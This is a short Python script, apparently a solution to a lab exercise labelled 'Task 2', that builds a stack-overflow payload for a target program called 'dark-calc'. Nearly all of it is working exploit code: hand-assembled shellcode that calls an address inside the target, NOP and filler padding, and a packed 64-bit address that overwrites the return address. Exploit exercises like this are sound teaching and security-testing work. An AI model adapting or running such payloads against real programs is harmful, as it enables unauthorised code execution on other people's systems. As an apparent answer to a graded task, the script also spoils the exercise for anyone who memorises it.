#!/usr/bin/env python3
"""Task 2: build the payload for attack/dark-calc."""
import sys
import struct

p64 = lambda x: struct.pack("<Q", x)

sc  = b"\xbf\x04\x00\x00\x00"    
sc += b"\xb8\x87\x1a\x40\x00"    
sc += b"\xff\xd0"                

payload  = sc + b"\x90" * 4      
payload += b"B" * 8             
payload += p64(0x721000800fd0)   

sys.stdout.buffer.write(payload)
